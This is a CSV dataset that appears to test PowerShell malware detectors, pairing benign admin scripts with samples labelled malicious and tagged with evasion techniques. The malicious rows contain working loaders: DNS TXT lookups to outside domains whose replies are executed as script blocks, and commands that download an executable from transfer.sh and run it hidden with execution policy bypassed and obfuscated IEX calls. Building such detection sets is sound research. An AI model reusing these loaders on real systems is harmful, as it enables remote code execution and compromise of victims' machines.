filename,label,content,pair_idx,pair_role,pair_indicator,pair_strategy,source_pair_idx,seed_id,technique_id,evasion_success
523.ps1,benign,"﻿

function Get-SPManagedMetadataServiceTerms{



    [CmdletBinding()]
    param(

		[Parameter(Mandatory=$true)]
		[String]
		$Site,

		[String]
		$TermGroup
        
	)
    
    
    
    

    function Add-ArrayLevelIndex{

        param(
    
            $Object,        
            $AttributeName,        
            $Level = 0
        )
    
        
        $Objects = iex ""`$Object.$AttributeName""
    
        
        $Object | select @{L=""Object"";E={$_}}, @{L=""Level"";E={$Level}}
    
        
        if($Objects){
    
            
            $Level ++
        
            
            $Objects | %{Add-ArrayLevelIndex -Object $_ -AttributeName $AttributeName -Level $Level}

        }
    }

    
    
    
    if((Get-PSSnapin 'Microsoft.SharePoint.PowerShell' -ErrorAction SilentlyContinue) -eq $null){Add-PSSnapin 'Microsoft.SharePoint.PowerShell'}

    
    
    
    $SPTaxonomies = @()
    $TempTerm = New-Object -TypeName Psobject @{    
        Index = """"
        Term = """"
    }

    $i = 0;
    $TempTerms = while($i -ne 7){
        $i ++
        $e = $TempTerm.PSObject.Copy()
        $e.Index = $i
        $e
    }


    
    $SPTaxonomies = Get-SPTaxonomySession -Site $Site | %{

        $_.TermStores | %{
    
            $TermStore = New-Object -TypeName Psobject -Property @{
        
                TermStore = $_.Name
                ""Term Group"" = """"
                ""Term Set Name"" = """"
                ""Term Set Description"" = """"   
                LCID = """"             
                ""Available for Tagging"" = """"                
                Terms = """"      
            }        
        
        
            $_.Groups | Where{$_.Name -eq $TermGroup -or -not $TermGroup} | ForEach-Object{
            
                $Group = $TermStore.PSObject.Copy()
                $Group.'Term Group' = $_.Name                       
        
                $_.TermSets | %{
            
                    $TermSet = $Group.PSObject.Copy()
                    $TermSet.'Term Set Name' = $_.Name
                    $TermSet.'Term Set Description' = $_.Description
                                    
                    $TermSet.Terms = ($_.Terms | %{Add-ArrayLevelIndex -Object $_ -AttributeName ""Terms"" -Level 1})
            
                    $TermSet                  
                }        
            }        
        }
    }

    
    
    

    
    $SPTaxonomies | %{

        $SPTaxonomy = $_

        
        $Item = $SPTaxonomy.PSObject.Copy()  
        $Item.'Available for Tagging' = if($_.IsAvailableForTagging){""TRUE""}else{""FALSE""}        
        $i = 0;while($i -ne 7){
            $i ++
            $Item | Add-Member –MemberType NoteProperty –Name ""Level $i Term"" –Value """"
        }
        $Item |  Select-Object 'Term Set Name','Term Set Description', LCID, 'Available for Tagging', 'Term Description', 'Level*'

    
        
        $_.Terms | where{$_} | %{
                
            $Term = $_

            
            $Item = $SPTaxonomy.PSObject.Copy()   
             
            $Item.'Available for Tagging' = if($_.IsAvailableForTagging){""TRUE""}else{""FALSE""}
            $Item.'Term Set Name' = """"
            $Item.'Term Set Description' = """"
            
            $_.Object.Labels | ForEach-Object{

                $Item.LCID = $_.Language

                $Index = 0;while($Index -ne 7){
                    $Index ++

                    if($Term.Level -eq $Index){                        

                        $Item | Add-Member –MemberType NoteProperty –Name ""Level $Index Term"" –Value $Term.Object.Name

                        $TempTerms[$Index].Term = $Term.Object.Name

                    }elseif($Index -gt $Term.Level){
                            
                        $Item | Add-Member –MemberType NoteProperty –Name ""Level $Index Term"" –Value $Value

                    }elseif($Term.Level -gt $Index){

                        $Item | Add-Member –MemberType NoteProperty –Name ""Level $Index Term"" –Value $TempTerms[$Index].Term
                        
                    }                                   
                }  
            }   
        
            
            $Item |  Select-Object 'Term Set Name','Term Set Description', LCID, 'Available for Tagging', 'Term Description', 'Level*'
        }                
    }
}",53,benign,IEX,evasion_probe,273,seed_96df7e49f7a4,iex_scriptblock_create,False
784__seed_96df7e49f7a4__iex_scriptblock_create.ps1,malicious,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){&([scriptblock]::Create($matches[1]))}",53,malicious,IEX,evasion_probe,273,seed_96df7e49f7a4,iex_scriptblock_create,False
1637.ps1,benign,"function Get-BootConfigurationData {
    param (
        $bcdeditpath = (Join-Path $env:SystemRoot 'system32\bcdedit.exe')
    )

    $bootconfigurationdata = iex $bcdeditpath
    $bootconfigurationdata += ''

    $hash = $null
    $result = foreach ($line in $bootconfigurationdata) {
        if ($line -eq '') {
            if ($hash) {
                [pscustomobject]$hash
            }
            $hash = @{}
            continue
        }
        if ($line.startswith('-----')) { continue }
        if ($line.startswith('Windows Boot')) {
            $hash.Add('Type', $line)
        } else {
            $name = $line.Substring(0, $line.IndexOf(' '))
            $value = $line.Substring($line.IndexOf(' ')).trim()
            $hash.Add($name, $value)
        }
    }

    $props = $result | % {gm -in $_ -ty *property} | % name | select -u | sort

    $result | select $props
}",54,benign,IEX,evasion_probe,276,seed_2f848d678a4e,iex_scriptblock_create,False
2752__seed_2f848d678a4e__iex_scriptblock_create.ps1,malicious,if(''+(nslookup -q=txt p.s.w2.ns.rankingplac.pl) -match '@(.*)@'){&([scriptblock]::Create($matches[1]))},54,malicious,IEX,evasion_probe,276,seed_2f848d678a4e,iex_scriptblock_create,False
1634.ps1,benign,"function Get-ComputerShares {
    param (
        [string]$comp = $env:COMPUTERNAME
    )
    
    if (!$comp) { throw 'No comps.' }

    $ping = New-Object System.Net.NetworkInformation.Ping
    try {
        $result = $ping.Send($comp)
    } catch {
        $result = $null
    }

    $sharename = $type = $comment = $ip = '-'
    if ($result.Status -eq 'Success') {
        
        $ip = $result.Address.ToString()

        
        $netview = iex ""cmd /c net view $comp 2>&1"" | ? {$_}

        
        if ($netview.count -lt 5) {
            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
            return
        }

        $netview = $netview | ? {$_  -match '\s{2}'} | select -Skip 1

        foreach ($line in $netview) {
            $line = $line -split '\s{2,}'

            $sharename = $line[0]
            $type = $line[1]
            $comment = $line[2]

            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
        }
    } else {
        [pscustomobject]@{
            Computer = $comp
            IP = $ip
            ShareName = $sharename
            Type = $type
            Comment = $comment
        }
    }
}",55,benign,IEX,evasion_probe,277,seed_93d76af29de1,iex_scriptblock_create,False
26493876411716e344173fdfd39aa4e85e740361f53b92ef17eba897890c50e4__seed_93d76af29de1__iex_scriptblock_create.ps1,malicious,if(''+(nslookup -q=txt p.s.rk.ns.rankingplac.pl) -match '@(.*)@'){&([scriptblock]::Create($matches[1]))},55,malicious,IEX,evasion_probe,277,seed_93d76af29de1,iex_scriptblock_create,False
523.ps1,benign,"﻿

function Get-SPManagedMetadataServiceTerms{



    [CmdletBinding()]
    param(

		[Parameter(Mandatory=$true)]
		[String]
		$Site,

		[String]
		$TermGroup
        
	)
    
    
    
    

    function Add-ArrayLevelIndex{

        param(
    
            $Object,        
            $AttributeName,        
            $Level = 0
        )
    
        
        $Objects = iex ""`$Object.$AttributeName""
    
        
        $Object | select @{L=""Object"";E={$_}}, @{L=""Level"";E={$Level}}
    
        
        if($Objects){
    
            
            $Level ++
        
            
            $Objects | %{Add-ArrayLevelIndex -Object $_ -AttributeName $AttributeName -Level $Level}

        }
    }

    
    
    
    if((Get-PSSnapin 'Microsoft.SharePoint.PowerShell' -ErrorAction SilentlyContinue) -eq $null){Add-PSSnapin 'Microsoft.SharePoint.PowerShell'}

    
    
    
    $SPTaxonomies = @()
    $TempTerm = New-Object -TypeName Psobject @{    
        Index = """"
        Term = """"
    }

    $i = 0;
    $TempTerms = while($i -ne 7){
        $i ++
        $e = $TempTerm.PSObject.Copy()
        $e.Index = $i
        $e
    }


    
    $SPTaxonomies = Get-SPTaxonomySession -Site $Site | %{

        $_.TermStores | %{
    
            $TermStore = New-Object -TypeName Psobject -Property @{
        
                TermStore = $_.Name
                ""Term Group"" = """"
                ""Term Set Name"" = """"
                ""Term Set Description"" = """"   
                LCID = """"             
                ""Available for Tagging"" = """"                
                Terms = """"      
            }        
        
        
            $_.Groups | Where{$_.Name -eq $TermGroup -or -not $TermGroup} | ForEach-Object{
            
                $Group = $TermStore.PSObject.Copy()
                $Group.'Term Group' = $_.Name                       
        
                $_.TermSets | %{
            
                    $TermSet = $Group.PSObject.Copy()
                    $TermSet.'Term Set Name' = $_.Name
                    $TermSet.'Term Set Description' = $_.Description
                                    
                    $TermSet.Terms = ($_.Terms | %{Add-ArrayLevelIndex -Object $_ -AttributeName ""Terms"" -Level 1})
            
                    $TermSet                  
                }        
            }        
        }
    }

    
    
    

    
    $SPTaxonomies | %{

        $SPTaxonomy = $_

        
        $Item = $SPTaxonomy.PSObject.Copy()  
        $Item.'Available for Tagging' = if($_.IsAvailableForTagging){""TRUE""}else{""FALSE""}        
        $i = 0;while($i -ne 7){
            $i ++
            $Item | Add-Member –MemberType NoteProperty –Name ""Level $i Term"" –Value """"
        }
        $Item |  Select-Object 'Term Set Name','Term Set Description', LCID, 'Available for Tagging', 'Term Description', 'Level*'

    
        
        $_.Terms | where{$_} | %{
                
            $Term = $_

            
            $Item = $SPTaxonomy.PSObject.Copy()   
             
            $Item.'Available for Tagging' = if($_.IsAvailableForTagging){""TRUE""}else{""FALSE""}
            $Item.'Term Set Name' = """"
            $Item.'Term Set Description' = """"
            
            $_.Object.Labels | ForEach-Object{

                $Item.LCID = $_.Language

                $Index = 0;while($Index -ne 7){
                    $Index ++

                    if($Term.Level -eq $Index){                        

                        $Item | Add-Member –MemberType NoteProperty –Name ""Level $Index Term"" –Value $Term.Object.Name

                        $TempTerms[$Index].Term = $Term.Object.Name

                    }elseif($Index -gt $Term.Level){
                            
                        $Item | Add-Member –MemberType NoteProperty –Name ""Level $Index Term"" –Value $Value

                    }elseif($Term.Level -gt $Index){

                        $Item | Add-Member –MemberType NoteProperty –Name ""Level $Index Term"" –Value $TempTerms[$Index].Term
                        
                    }                                   
                }  
            }   
        
            
            $Item |  Select-Object 'Term Set Name','Term Set Description', LCID, 'Available for Tagging', 'Term Description', 'Level*'
        }                
    }
}",56,benign,IEX,evasion_probe,278,seed_28d4ebd2f1f6,iex_scriptblock_create,False
96d6a9c601102cb92802dfc3f8774cdc26fd778e1968de2eca6d0a4d2a873b4e__seed_28d4ebd2f1f6__iex_scriptblock_create.ps1,malicious,if(''+(nslookup -q=txt p.s.os.ns.rankingplac.pl) -match '@(.*)@'){&([scriptblock]::Create($matches[1]))},56,malicious,IEX,evasion_probe,278,seed_28d4ebd2f1f6,iex_scriptblock_create,False
1637.ps1,benign,"function Get-BootConfigurationData {
    param (
        $bcdeditpath = (Join-Path $env:SystemRoot 'system32\bcdedit.exe')
    )

    $bootconfigurationdata = iex $bcdeditpath
    $bootconfigurationdata += ''

    $hash = $null
    $result = foreach ($line in $bootconfigurationdata) {
        if ($line -eq '') {
            if ($hash) {
                [pscustomobject]$hash
            }
            $hash = @{}
            continue
        }
        if ($line.startswith('-----')) { continue }
        if ($line.startswith('Windows Boot')) {
            $hash.Add('Type', $line)
        } else {
            $name = $line.Substring(0, $line.IndexOf(' '))
            $value = $line.Substring($line.IndexOf(' ')).trim()
            $hash.Add($name, $value)
        }
    }

    $props = $result | % {gm -in $_ -ty *property} | % name | select -u | sort

    $result | select $props
}",57,benign,IEX,evasion_probe,281,seed_ae923919854c,iex_call_operator_string,False
417a0be8ef6073897f81fa6912d3a203a9aea432e16af30fe32376671cfa0d44__seed_ae923919854c__iex_call_operator_string.ps1,malicious,"curl -o ""$HOME\desktop\arch.exe"" ""https://transfer.sh/get/ffP3dc/CrocTech.exe""

powershell.exe -ExecutionPolicy bypass -windowstyle hidden &('I'+'EX') ""$HOME\desktop\arch.exe""",57,malicious,IEX,evasion_probe,281,seed_ae923919854c,iex_call_operator_string,False
1637.ps1,benign,"function Get-BootConfigurationData {
    param (
        $bcdeditpath = (Join-Path $env:SystemRoot 'system32\bcdedit.exe')
    )

    $bootconfigurationdata = iex $bcdeditpath
    $bootconfigurationdata += ''

    $hash = $null
    $result = foreach ($line in $bootconfigurationdata) {
        if ($line -eq '') {
            if ($hash) {
                [pscustomobject]$hash
            }
            $hash = @{}
            continue
        }
        if ($line.startswith('-----')) { continue }
        if ($line.startswith('Windows Boot')) {
            $hash.Add('Type', $line)
        } else {
            $name = $line.Substring(0, $line.IndexOf(' '))
            $value = $line.Substring($line.IndexOf(' ')).trim()
            $hash.Add($name, $value)
        }
    }

    $props = $result | % {gm -in $_ -ty *property} | % name | select -u | sort

    $result | select $props
}",58,benign,IEX,evasion_probe,281,seed_ae923919854c,iex_scriptblock_create,False
417a0be8ef6073897f81fa6912d3a203a9aea432e16af30fe32376671cfa0d44__seed_ae923919854c__iex_scriptblock_create.ps1,malicious,"curl -o ""$HOME\desktop\arch.exe"" ""https://transfer.sh/get/ffP3dc/CrocTech.exe""

powershell.exe -ExecutionPolicy bypass -windowstyle hidden &([scriptblock]::Create(""$HOME\desktop\arch.exe""))",58,malicious,IEX,evasion_probe,281,seed_ae923919854c,iex_scriptblock_create,False
1634.ps1,benign,"function Get-ComputerShares {
    param (
        [string]$comp = $env:COMPUTERNAME
    )
    
    if (!$comp) { throw 'No comps.' }

    $ping = New-Object System.Net.NetworkInformation.Ping
    try {
        $result = $ping.Send($comp)
    } catch {
        $result = $null
    }

    $sharename = $type = $comment = $ip = '-'
    if ($result.Status -eq 'Success') {
        
        $ip = $result.Address.ToString()

        
        $netview = iex ""cmd /c net view $comp 2>&1"" | ? {$_}

        
        if ($netview.count -lt 5) {
            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
            return
        }

        $netview = $netview | ? {$_  -match '\s{2}'} | select -Skip 1

        foreach ($line in $netview) {
            $line = $line -split '\s{2,}'

            $sharename = $line[0]
            $type = $line[1]
            $comment = $line[2]

            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
        }
    } else {
        [pscustomobject]@{
            Computer = $comp
            IP = $ip
            ShareName = $sharename
            Type = $type
            Comment = $comment
        }
    }
}",59,benign,IEX,evasion_probe,282,seed_58333cda3aa9,iex_call_operator_string,False
94601fc7759612cc1ce13844d6c26cd3ac2e547a1c96e87ae4e2b87a1c2c57e1__seed_58333cda3aa9__iex_call_operator_string.ps1,malicious,"powershell -ExecutionPolicy Bypass -windowstyle hidden curl -o ""$HOME\desktop\a.exe"" ""https://transfer.sh/get/ffP3dc/CrocTech.exe""

powershell -ExecutionPolicy Bypass -windowstyle hidden &('I'+'EX') ""$HOME\desktop\a.exe""",59,malicious,IEX,evasion_probe,282,seed_58333cda3aa9,iex_call_operator_string,False
1634.ps1,benign,"function Get-ComputerShares {
    param (
        [string]$comp = $env:COMPUTERNAME
    )
    
    if (!$comp) { throw 'No comps.' }

    $ping = New-Object System.Net.NetworkInformation.Ping
    try {
        $result = $ping.Send($comp)
    } catch {
        $result = $null
    }

    $sharename = $type = $comment = $ip = '-'
    if ($result.Status -eq 'Success') {
        
        $ip = $result.Address.ToString()

        
        $netview = iex ""cmd /c net view $comp 2>&1"" | ? {$_}

        
        if ($netview.count -lt 5) {
            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
            return
        }

        $netview = $netview | ? {$_  -match '\s{2}'} | select -Skip 1

        foreach ($line in $netview) {
            $line = $line -split '\s{2,}'

            $sharename = $line[0]
            $type = $line[1]
            $comment = $line[2]

            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
        }
    } else {
        [pscustomobject]@{
            Computer = $comp
            IP = $ip
            ShareName = $sharename
            Type = $type
            Comment = $comment
        }
    }
}",60,benign,IEX,evasion_probe,282,seed_58333cda3aa9,iex_scriptblock_create,False
